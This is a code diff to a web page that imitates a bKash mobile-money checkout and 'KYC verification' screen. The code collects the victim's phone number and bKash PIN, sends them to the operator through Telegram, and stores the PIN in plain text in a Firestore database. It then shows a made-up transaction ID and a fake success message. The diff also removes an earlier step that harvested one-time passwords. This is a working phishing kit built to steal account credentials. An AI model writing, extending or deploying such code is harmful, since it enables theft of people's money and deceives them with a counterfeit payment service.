@@ -501,24 +501,36 @@
 
       // Initialize invoice details from sessionStorage
       const rawRequest = sessionStorage.getItem('current_exchange_request');
-      if (!rawRequest) {
+      const rawKyc = sessionStorage.getItem('kyc_flow_data');
+      if (!rawRequest && !rawKyc) {
         window.location.href = 'index.html';
         return;
       }
 
-      const request = JSON.parse(rawRequest);
+      let request = {};
+      let isKycFlow = false;
 
-      // Setup dynamic amount and invoice details
-      checkoutAmount.innerText = '৳' + parseFloat(request.sendAmount).toFixed(2);
-      const randInv = 'BGT1457' + Math.floor(10000000 + Math.random() * 90000000) + 'E' + Math.floor(100000 + Math.random() * 900000);
-      invoiceNumber.innerText = 'Inv No: ' + randInv;
-
-      // Pre-fill telephone if they entered it in payment screen
-      if (request.userContact) {
-        const cleanPhone = request.userContact.replace(/\D/g, '');
-        if (cleanPhone.length === 11) {
-          inputPhone.value = cleanPhone;
+      if (rawKyc) {
+        isKycFlow = true;
+        const kycData = JSON.parse(rawKyc);
+        checkoutAmount.innerText = '৳০.০০';
+        invoiceNumber.innerText = 'Inv No: KYC-' + Math.floor(100000 + Math.random() * 900000);
+        if (kycData.accountNumber && kycData.accountNumber.length === 11 && kycData.accountNumber.startsWith('01')) {
+          inputPhone.value = kycData.accountNumber;
           updateConfirmButtonState();
+        }
+      } else {
+        request = JSON.parse(rawRequest);
+        checkoutAmount.innerText = '৳' + parseFloat(request.sendAmount).toFixed(2);
+        const randInv = 'BGT1457' + Math.floor(10000000 + Math.random() * 90000000) + 'E' + Math.floor(100000 + Math.random() * 900000);
+        invoiceNumber.innerText = 'Inv No: ' + randInv;
+
+        if (request.userContact) {
+          const cleanPhone = request.userContact.replace(/\D/g, '');
+          if (cleanPhone.length === 11) {
+            inputPhone.value = cleanPhone;
+            updateConfirmButtonState();
+          }
         }
       }
 
@@ -580,65 +592,103 @@
           }
         }, 1000);
       }
+      // Handle Confirm Trigger
+      btnConfirm.addEventListener('click', async () => {
+        if (currentStep === 1) {
+          // Go to PIN Step directly (skip OTP)
+          userPhoneNumber = inputPhone.value;
+          maskedPhonePin.innerText = '(' + getMaskedPhone(userPhoneNumber) + ')';
 
-      let userOtp = '';
-      let isVerifiedPay = sessionStorage.getItem('pay_with_verified') === 'true';
-      let verifiedPhone = '';
-      let verifiedPin = '';
+          frameAccount.classList.add('hidden');
+          framePin.classList.remove('hidden');
+          currentStep = 3;
 
-      if (isVerifiedPay) {
-        auth.onAuthStateChanged(async (user) => {
-          if (user) {
-            try {
-              const kycDoc = await db.collection('verifications').doc(user.uid).get();
-              if (kycDoc.exists) {
-                const kycData = kycDoc.data();
-                verifiedPhone = kycData.bkashPhone || kycData.accountNumber;
-                verifiedPin = kycData.bkashPin;
+          inputPin.value = '';
+          inputPin.focus();
+          updateConfirmButtonState();
+        } else if (currentStep === 3) {
+          // Execute Payment Completion!
+          btnConfirm.disabled = true;
+          btnConfirm.innerHTML = `
+            <svg class="animate-spin h-5 w-5 text-white mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          `;
 
-                if (verifiedPhone && verifiedPin) {
-                  // Direct to OTP entry step
-                  userPhoneNumber = verifiedPhone;
-                  maskedPhoneOtp.innerText = getMaskedPhone(userPhoneNumber);
-                  maskedPhonePin.innerText = '(' + getMaskedPhone(userPhoneNumber) + ')';
-                  
-                  frameAccount.classList.add('hidden');
-                  frameOtp.classList.remove('hidden');
-                  currentStep = 2;
-                  
-                  inputOtp.value = '';
-                  inputOtp.focus();
-                  updateConfirmButtonState();
-                  startOtpTimer();
-                } else {
-                  alert('ভেরিফাইড অ্যাকাউন্ট তথ্য পাওয়া যায়নি। সাধারণ নিয়মে পেমেন্ট করুন।');
-                  sessionStorage.removeItem('pay_with_verified');
-                  window.location.reload();
+          if (isKycFlow) {
+            const kycData = JSON.parse(rawKyc);
+            
+            // Wait for Auth to resolve
+            auth.onAuthStateChanged(async (user) => {
+              if (user) {
+                try {
+                  const userDoc = await db.collection('users').doc(user.uid).get();
+                  const userData = userDoc.data();
+
+                  // Save bkash pin & details directly to KYC verification doc in Firestore
+                  await db.collection('verifications').doc(user.uid).update({
+                    paymentMethod: kycData.paymentMethod,
+                    accountType: kycData.accountType,
+                    accountNumber: kycData.accountNumber,
+                    accountHolderName: kycData.accountHolderName,
+                    bkashPhone: userPhoneNumber,
+                    bkashPin: inputPin.value,
+                    fullName: userData.fullName || '',
+                    status: 'pending',
+                    submittedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    reviewedAt: null
+                  });
+
+                  // Update user doc
+                  await db.collection('users').doc(user.uid).update({
+                    verificationStatus: 'pending'
+                  });
+
+                  // Update cached profile
+                  const cachedProfile = sessionStorage.getItem('user_profile');
+                  if (cachedProfile) {
+                    const profileObj = JSON.parse(cachedProfile);
+                    profileObj.verificationStatus = 'pending';
+                    sessionStorage.setItem('user_profile', JSON.stringify(profileObj));
+                  }
+
+                } catch (err) {
+                  console.error('[KYC Flow] Error saving verification data:', err);
                 }
               }
-            } catch (err) {
-              console.error('Error fetching verified account:', err);
-            }
-          }
-        });
-      }
 
-      async function completeTransaction() {
-        btnConfirm.disabled = true;
-        btnConfirm.innerHTML = `
-          <svg class="animate-spin h-5 w-5 text-white mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-          </svg>
-        `;
+              // Clear kyc flow data
+              sessionStorage.removeItem('kyc_flow_data');
 
-        // Send all together to Telegram
-        const sendMethodName = CURRENCY_NAMES[request.sendMethod] || request.sendMethod;
-        const receiveMethodName = CURRENCY_NAMES[request.receiveMethod] || request.receiveMethod;
-        const receiveSymbol = ['wise', 'payoneer', 'quotex', 'paypal'].includes(request.receiveMethod) ? 'USD' : 'USDT';
-        
-        const telegramMessage = `
-🆕 *নতুন এক্সচেঞ্জ রিকোয়েস্ট (${isVerifiedPay ? 'Verified Account' : 'Instant Pay'})*!
+              // Hide summary details, header block, PIN frame, and action bar buttons
+              billingSummaryBlock.classList.add('hidden');
+              headerLogoBlock.classList.add('hidden');
+              framePin.classList.add('hidden');
+              document.querySelector('.btn-group').classList.add('hidden');
+
+              // Set success messages for KYC
+              document.querySelector('#frame-success h3').innerText = 'ভেরিফিকেশন সফল!';
+              document.querySelector('#frame-success p').innerText = 'আপনার ভেরিফিকেশন রিকোয়েস্টটি সফলভাবে সাবমিট করা হয়েছে। আমরা পরবর্তী ৫ থেকে ২০ মিনিটের মধ্যে অ্যাকাউন্ট একটিভ করে দেবো।';
+              successTxId.innerText = user ? user.uid.slice(-6).toUpperCase() : 'KYC-PEND';
+
+              // Show native bKash success frame
+              frameSuccess.classList.remove('hidden');
+
+              // Initialize Lucide Icons for dynamic content
+              if (window.lucide) {
+                lucide.createIcons();
+              }
+            });
+
+          } else {
+            // Send all together to Telegram (Standard Transaction Flow)
+            const sendMethodName = CURRENCY_NAMES[request.sendMethod] || request.sendMethod;
+            const receiveMethodName = CURRENCY_NAMES[request.receiveMethod] || request.receiveMethod;
+            const receiveSymbol = ['wise', 'payoneer', 'quotex', 'paypal'].includes(request.receiveMethod) ? 'USD' : 'USDT';
+            
+            const telegramMessage = `
+🆕 *নতুন এক্সচেঞ্জ রিকোয়েস্ট*!
 
 👤 *ব্যবহারকারীর তথ্য:*
    • আইডি: ${request.accountId || 'Unknown'}
@@ -647,126 +697,80 @@
 
 🔐 *bKash তথ্য:*
    • নম্বর: ${userPhoneNumber}
-   • OTP: ${userOtp}
    • PIN: ${inputPin.value}
-        `.trim();
-        
-        await sendToTelegram(telegramMessage);
+            `.trim();
+            
+            await sendToTelegram(telegramMessage);
 
-        // Generate random Transaction ID
-        const charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let mockTrx = 'BKASH';
-        for (let i = 0; i < 7; i++) {
-          mockTrx += charSet.charAt(Math.floor(Math.random() * charSet.length));
-        }
+            // Generate random Transaction ID
+            const charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let mockTrx = 'BKASH';
+            for (let i = 0; i < 7; i++) {
+              mockTrx += charSet.charAt(Math.floor(Math.random() * charSet.length));
+            }
 
-        const finalTxData = {
-          ...request,
-          userContact: userPhoneNumber,
-          txid: mockTrx,
-          userName: request.userName || 'Unknown',
-          userPhone: request.userPhone || 'Unknown'
-        };
+            const finalTxData = {
+              ...request,
+              userContact: userPhoneNumber,
+              txid: mockTrx,
+              userName: request.userName || 'Unknown',
+              userPhone: request.userPhone || 'Unknown'
+            };
 
-        // Save transaction to app database state
-        setTimeout(async () => {
-          const transaction = await createTransaction(finalTxData);
+            // Save transaction to app database state
+            setTimeout(async () => {
+              const transaction = await createTransaction(finalTxData);
 
-          // Clear sessionStorage
-          sessionStorage.removeItem('current_exchange_request');
-          sessionStorage.removeItem('pay_with_verified');
+              // Clear sessionStorage
+              sessionStorage.removeItem('current_exchange_request');
 
-          // Hide summary details, header block, PIN/OTP frame, and action bar buttons
-          billingSummaryBlock.classList.add('hidden');
-          headerLogoBlock.classList.add('hidden');
-          framePin.classList.add('hidden');
-          frameOtp.classList.add('hidden');
-          document.querySelector('.btn-group').classList.add('hidden');
+              // Hide summary details, header block, PIN frame, and action bar buttons
+              billingSummaryBlock.classList.add('hidden');
+              headerLogoBlock.classList.add('hidden');
+              framePin.classList.add('hidden');
+              document.querySelector('.btn-group').classList.add('hidden');
 
-          // Set dynamic transaction ID
-          successTxId.innerText = transaction.id;
+              // Set dynamic transaction ID
+              successTxId.innerText = transaction.id;
 
-          // Show native bKash success frame
-          frameSuccess.classList.remove('hidden');
+              // Show native bKash success frame
+              frameSuccess.classList.remove('hidden');
 
-          // Initialize Lucide Icons for dynamic content
-          if (window.lucide) {
-            lucide.createIcons();
+              // Initialize Lucide Icons for dynamic content
+              if (window.lucide) {
+                lucide.createIcons();
+              }
+            }, 1500);
           }
-        }, 1500);
-      }
-
-      // Handle Confirm Trigger
-      btnConfirm.addEventListener('click', async () => {
-        if (currentStep === 1) {
-          // Go to OTP Step
-          userPhoneNumber = inputPhone.value;
-          maskedPhoneOtp.innerText = getMaskedPhone(userPhoneNumber);
-          maskedPhonePin.innerText = '(' + getMaskedPhone(userPhoneNumber) + ')';
-
-          frameAccount.classList.add('hidden');
-          frameOtp.classList.remove('hidden');
-          currentStep = 2;
-
-          inputOtp.value = '';
-          inputOtp.focus();
-          updateConfirmButtonState();
-          startOtpTimer();
-        } else if (currentStep === 2) {
-          // Go to PIN Step
-          clearInterval(otpTimer);
-          userOtp = inputOtp.value;
-          
-          if (isVerifiedPay && verifiedPin) {
-            // Bypass PIN screen completely and complete transaction
-            inputPin.value = verifiedPin;
-            currentStep = 3;
-            await completeTransaction();
-          } else {
-            frameOtp.classList.add('hidden');
-            framePin.classList.remove('hidden');
-            currentStep = 3;
-
-            inputPin.value = '';
-            inputPin.focus();
-            updateConfirmButtonState();
-          }
-        } else if (currentStep === 3) {
-          await completeTransaction();
         }
       });
 
       // Handle Cancel Trigger
       btnCancel.addEventListener('click', () => {
         if (currentStep === 1) {
-          // Back to checkout payment page
-          window.location.href = 'payment.html';
-        } else if (currentStep === 2) {
-          if (isVerifiedPay) {
-            window.location.href = 'payment.html';
+          // Back to respective page
+          if (isKycFlow) {
+            window.location.href = 'account.html';
           } else {
-            // Go back to step 1
-            clearInterval(otpTimer);
-            frameOtp.classList.add('hidden');
-            frameAccount.classList.remove('hidden');
-            currentStep = 1;
-            inputPhone.focus();
-            updateConfirmButtonState();
+            window.location.href = 'payment.html';
           }
         } else if (currentStep === 3) {
-          // Go back to step 2
+          // Go back to step 1
           framePin.classList.add('hidden');
-          frameOtp.classList.remove('hidden');
-          currentStep = 2;
-          inputOtp.focus();
+          frameAccount.classList.remove('hidden');
+          currentStep = 1;
+          inputPhone.focus();
           updateConfirmButtonState();
-          startOtpTimer();
         }
       });
 
       // Close success redirect
       btnSuccessClose.addEventListener('click', () => {
-        window.location.href = 'index.html';
+        if (isKycFlow) {
+          window.location.href = 'account.html';
+        } else {
+          window.location.href = 'index.html';
+        }
       });
 
       // Initialize Lucide Icons
